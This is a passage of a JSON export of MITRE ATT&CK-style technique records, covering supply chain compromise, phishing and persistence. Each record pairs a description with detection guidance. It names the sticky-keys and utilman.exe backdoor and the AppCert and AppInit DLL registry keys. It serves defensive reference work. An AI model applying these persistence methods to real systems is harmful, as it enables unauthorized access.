16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Users can detect malicious applications by watching for nuances that could indicate the application is not the intended one when it is being installed.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":467,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":467,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":487,"name":"T1474 - Supply Chain Compromise","sort_id":0,"external_id":"T1474","external_sub_id":null,"old_external_id":"MOB-T1077","old_external_sub_id":null,"tactic_id":24,"description":"<p>As further described in <a href=\"https:\/\/attack.mitre.org\/techniques\/T1195\">Supply Chain Compromise<\/a>, supply chain compromise is the manipulation of products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise. Somewhat related, adversaries could also identify and exploit inadvertently present vulnerabilities. In many cases, it may be difficult to be certain whether exploitable functionality is due to malicious intent or simply inadvertent mistake.<\/p>\n<p>Related PRE-ATT&amp;CK techniques include:<\/p>\n<ul>\n<li><a href=\"https:\/\/attack.mitre.org\/techniques\/T1389\">Identify vulnerabilities in third-party software libraries<\/a> - Third-party libraries incorporated into mobile apps could contain malicious behavior, privacy-invasive behavior, or exploitable vulnerabilities. An adversary could deliberately insert malicious behavior or could exploit inadvertent vulnerabilities. For example, Ryan Welton of NowSecure identified exploitable remote code execution vulnerabilities in a third-party advertisement library (Citation: NowSecure-RemoteCode). Grace et al. identified security issues in mobile advertisement libraries (Citation: Grace-Advertisement).<\/li>\n<li><a href=\"https:\/\/attack.mitre.org\/techniques\/T1394\">Distribute malicious software development tools<\/a> - As demonstrated by the XcodeGhost attack (Citation: PaloAlto-XcodeGhost1), app developers could be provided with modified versions of software development tools (e.g. compilers) that automatically inject malicious or exploitable code into applications.<\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-07-28 16:02:21","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"* Insecure third-party libraries could be detected by application vetting techniques. For example, Google's [App Security Improvement Program](https:\/\/developer.android.com\/google\/play\/asi) detects the use of third-party libraries with known vulnerabilities within Android apps submitted to the Google Play Store.\n* Malicious software development tools could be detected by enterprises deploying integrity checking software to the computers that they use to develop code to detect presence of unauthorized, modified software development tools.","platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":487,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":487,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":543,"name":"T1195.003 - Compromise Hardware Supply Chain","sort_id":0,"external_id":"T1195.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":24,"description":"<p>Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Perform physical inspection of hardware to look for potential tampering. Perform integrity checking on pre-OS boot mechanisms that can be manipulated for malicious purposes.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":543,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":543,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":543,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":544,"name":"T1195.001 - Compromise Software Dependencies and Development Tools","sort_id":0,"external_id":"T1195.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":24,"description":"<p>Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency. (Citation: Trendmicro NPM Compromise)  <\/p>\n<p>Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":544,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":544,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":544,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":545,"name":"T1195.002 - Compromise Software Supply Chain","sort_id":0,"external_id":"T1195.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":24,"description":"<p>Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update\/distribution mechanism for that software, or replacing compiled releases with a modified version.<\/p>\n<p>Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018) (Citation: Command Five SK 2011)  <\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. ","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":545,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":545,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":545,"platform_id":3,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}}]},{"id":696,"name":"T1566 - Phishing","sort_id":0,"external_id":"T1566","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":24,"description":"<p>Adversaries may send phishing messages to elicit sensitive information and\/or gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.<\/p>\n<p>Adversaries may send victim\u2019s emails containing malicious attachments or links, typically to execute malicious code on victim systems or to gather credentials for use of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1078\">Valid Accounts<\/a>. Phishing may also be conducted via third-party services, like social media platforms.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Network intrusion detection systems and email gateways can be used to detect phishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nURL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.\n\nBecause most common third-party services used for phishing via service leverage TLS encryption, SSL\/TLS inspection is generally required to detect the initial communication\/delivery. With SSL\/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware.\n\nAnti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Many possible detections of follow-on behavior may take place once [User Execution](https:\/\/attack.mitre.org\/techniques\/T1204) occurs.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":696,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":696,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":696,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":696,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":696,"platform_id":9,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":755,"name":"T1566.001 - Spearphishing Attachment","sort_id":0,"external_id":"T1566.001","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":24,"description":"<p>Adversaries may send spearphishing emails with a malicious attachment in an attempt to elicit sensitive information and\/or gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon <a href=\"https:\/\/attack.mitre.org\/techniques\/T1204\">User Execution<\/a> to gain execution.<\/p>\n<p>There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.\n\nAnti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https:\/\/attack.mitre.org\/techniques\/T1203) or usage of malicious scripts.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":755,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":755,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":755,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":756,"name":"T1566.002 - Spearphishing Link","sort_id":0,"external_id":"T1566.002","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":24,"description":"<p>Adversaries may send spearphishing emails with a malicious link in an attempt to elicit sensitive information and\/or gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. <\/p>\n<p>All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging <a href=\"https:\/\/attack.mitre.org\/techniques\/T1204\">User Execution<\/a>. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs\/web beacons). Links may also direct users to malicious applications  designed to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1528\">Steal Application Access Token<\/a>s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.\n\nBecause this technique usually involves user interaction on the endpoint, many of the possible detections take place once [User Execution](https:\/\/attack.mitre.org\/techniques\/T1204) occurs.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":756,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":756,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":756,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":756,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":756,"platform_id":9,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":757,"name":"T1566.003 - Spearphishing via Service","sort_id":0,"external_id":"T1566.003","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":24,"description":"<p>Adversaries may send spearphishing messages via third-party services in an attempt to elicit sensitive information and\/or gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. <\/p>\n<p>All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.<\/p>\n<p>A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.<\/p>","is_deprecated":false,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Because most common third-party services used for spearphishing via service leverage TLS encryption, SSL\/TLS inspection is generally required to detect the initial communication\/delivery. With SSL\/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware. \n\nAnti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https:\/\/attack.mitre.org\/techniques\/T1203) or usage of malicious scripts.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":757,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":757,"platform_id":2,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":757,"platform_id":3,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]}]},{"id":26,"name":"Persistence","source_name":"ENTERPRISE_persistence","sort_id":0,"external_id":"TA0003","category_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"framework_stage_id":16,"tactic_id":26},"techniques":[{"id":151,"name":"T1156 - .bash_profile and .bashrc","sort_id":0,"external_id":"T1156","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p><code>~\/.bash_profile<\/code> and <code>~\/.bashrc<\/code> are shell scripts that contain shell commands. These files are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. <code>~\/.bash_profile<\/code> is executed for login shells and <code>~\/.bashrc<\/code> is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), the <code>~\/.bash_profile<\/code> script is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, the <code>~\/.bashrc<\/code> script is executed. This allows users more fine-grained control over when they want certain commands executed. These shell scripts are meant to be written to by the local user to configure their own environment. <\/p>\n<p>The macOS Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling <code>~\/.bash_profile<\/code> each time instead of <code>~\/.bashrc<\/code>.<\/p>\n<p>Adversaries may abuse these shell scripts by inserting arbitrary shell commands that may be used to execute other binaries to gain persistence. Every time the user logs in or opens a new shell, the modified ~\/.bash_profile and\/or ~\/.bashrc scripts will be executed.(Citation: amnesia malware).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":151,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":151,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":153,"name":"T1015 - Accessibility Features","sort_id":0,"external_id":"T1015","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.<\/p>\n<p>Two common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe<\/code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe<\/code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as &quot;sticky keys&quot;, and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)<\/p>\n<p>Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\<\/code>, and it must be protected by Windows File or Resource Protection (WFP\/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:<\/p>\n<p>For simple binary replacement on Windows XP and later as well as and Windows Server 2003\/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe<\/code>) may be replaced with &quot;cmd.exe&quot; (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over <a href=\"https:\/\/attack.mitre.org\/techniques\/T1076\">Remote Desktop Protocol<\/a> will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)<\/p>\n<p>For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures &quot;cmd.exe,&quot; or another program that provides backdoor access, as a &quot;debugger&quot; for the accessibility program (e.g., &quot;utilman.exe&quot;). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the &quot;debugger&quot; program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)<\/p>\n<p>Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)<\/p>\n<ul>\n<li>On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe<\/code><\/li>\n<li>Magnifier: <code>C:\\Windows\\System32\\Magnify.exe<\/code><\/li>\n<li>Narrator: <code>C:\\Windows\\System32\\Narrator.exe<\/code><\/li>\n<li>Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe<\/code><\/li>\n<li>App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe<\/code><\/li>\n<\/ul>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":153,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":156,"name":"T1098 - Account Manipulation","sort_id":0,"external_id":"T1098","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:19","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Collect events that correlate with changes to account objects and\/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670.(Citation: Microsoft User Modified Event)(Citation: Microsoft Security Event 4670)(Citation: Microsoft Security Event 4670) Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ(Citation: InsiderThreat ChangeNTLM July 2017) or that include additional flags such as changing a password without knowledge of the old password.(Citation: GitHub Mimikatz Issue 92 June 2017)\n\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.\n\nMonitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":156,"platform_id":1,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":156,"platform_id":2,"created_at":"2020-07-28 16:02:19","updated_at":"2020-07-28 16:02:19"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":156,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":156,"platform_id":4,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":156,"platform_id":5,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":156,"platform_id":6,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":156,"platform_id":7,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":156,"platform_id":8,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":157,"name":"T1182 - AppCert DLLs","sort_id":0,"external_id":"T1182","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager<\/code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec. (Citation: Endgame Process Injection July 2017)<\/p>\n<p>Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\">Process Injection<\/a>, this value can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":157,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":158,"name":"T1103 - AppInit DLLs","sort_id":0,"external_id":"T1103","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":26,"description":"<p>Dynamic-link libraries (DLLs) that are specified in the AppInit_DLLs value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows<\/code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows<\/code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Endgame Process Injection July 2017) Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1055\">Process Injection<\/a>, these values can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry)<\/p>\n<p>The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":158,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":162,"name":"T1138 - Application 